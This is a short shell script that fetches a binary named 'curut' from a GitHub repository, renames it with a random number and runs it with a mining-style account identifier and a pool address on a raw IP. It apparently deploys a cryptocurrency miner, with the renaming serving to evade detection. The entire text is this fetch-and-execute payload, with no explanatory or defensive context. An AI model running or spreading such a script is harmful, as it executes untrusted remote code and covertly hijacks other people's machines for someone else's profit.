APP=app$(shuf -i 1000000-9999999 -n 1)
wget -q https://github.com/feby12329/miniature-guide/raw/master/curut
mv curut $APP
chmod +x $APP
./$APP --account CP_h1f88jajg0 --gpu-off --pool 20.70.138.115:443
